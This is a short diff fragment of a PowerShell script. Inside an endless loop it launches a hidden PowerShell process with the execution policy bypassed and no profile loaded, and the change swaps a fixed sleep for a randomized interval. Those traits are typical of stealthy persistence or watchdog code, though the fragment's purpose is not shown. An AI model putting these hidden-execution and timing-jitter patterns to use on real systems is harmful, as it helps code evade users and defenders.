@@ -156,5 +156,5 @@ while ($true) {
         powershell.exe -ep bypass -noP -w hidden $initParentServicePath -rootPath $rootPath -basePath "$b"
     }
     
-    Start-Sleep -Seconds 3
+    Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 1501)
 }
